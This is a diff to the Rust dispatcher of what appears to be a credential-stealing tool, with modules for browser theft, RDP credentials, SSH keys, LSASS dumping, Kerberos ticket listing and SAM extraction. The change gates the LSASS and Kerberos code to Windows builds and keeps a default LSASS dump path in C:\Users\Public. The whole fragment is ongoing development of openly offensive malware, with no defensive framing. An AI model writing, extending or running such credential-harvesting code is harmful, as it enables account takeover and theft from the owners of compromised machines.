@@ -6,7 +6,10 @@ mod browser_stealer;
 mod rdp_creds;
 mod ssh_keys;
 mod other_software;
+// lsass/kerberos 依赖 Windows 专属 FFI（browser_ffi/LSA），非 Windows 不编译。
+#[cfg(target_os = "windows")]
 mod lsass;
+#[cfg(target_os = "windows")]
 mod kerberos;
 mod sam;
 
@@ -54,12 +57,28 @@ fn dispatch(input: &str) -> String {
         "ssh" => ssh_keys::SshKeys::collect(),
         "rdp" => rdp_creds::RdpCreds::collect(),
         "lsass" => {
-            let path = v.get("path")
-                .and_then(|p| p.as_str())
-                .unwrap_or("C:\\Users\\Public\\lsass.dmp");
-            lsass::dump_lsass(path)
+            #[cfg(target_os = "windows")]
+            {
+                let path = v.get("path")
+                    .and_then(|p| p.as_str())
+                    .unwrap_or("C:\\Users\\Public\\lsass.dmp");
+                return lsass::dump_lsass(path);
+            }
+            #[cfg(not(target_os = "windows"))]
+            {
+                r#"{"success":false,"error":"lsass dump not supported on this platform"}"#.to_string()
+            }
         }
-        "klist" => kerberos::klist(),
+        "klist" => {
+            #[cfg(target_os = "windows")]
+            {
+                return kerberos::klist();
+            }
+            #[cfg(not(target_os = "windows"))]
+            {
+                r#"{"success":false,"error":"kerberos klist not supported on this platform"}"#.to_string()
+            }
+        }
         "sam" => {
             let dir = v.get("dir")
                 .and_then(|p| p.as_str())
